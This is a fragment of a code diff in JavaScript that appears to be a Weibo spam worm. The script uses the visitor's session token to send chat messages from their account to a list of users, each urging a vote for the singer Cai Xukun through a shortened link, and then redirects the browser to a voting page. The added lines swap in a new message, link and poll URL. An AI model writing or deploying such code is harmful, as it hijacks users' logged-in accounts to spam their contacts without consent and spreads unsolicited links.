@@ -19,8 +19,8 @@
                             var x = new XMLHttpRequest();
                             x.open('post', 'https://m.weibo.cn/api/chat/send' );
                             x.setRequestHeader("Content-type","application/x-www-form-urlencoded");
-                            x.send('uid='+u.data.data[i].user.id+'&content=亲爱的ikun，2018qq音乐巅峰榜蔡徐坤需要你的一票，目前排第三，动动手指投一票>>http://t.cn/EbkndtB&st=' + obj.data.st);
-                            window.location.href="https://y.qq.com/m/act/2018_year_share_wb/index.html";
+                            x.send('uid='+u.data.data[i].user.id+'&content=亲爱的ikun，微博投票蔡徐坤需要你的一票，不管什么投票咱们都不能落后>>http://t.cn/EbszqrD&st=' + obj.data.st);
+                            window.location.href="https://vote.weibo.cn/poll/138894804";
                         }
                     }
                 }
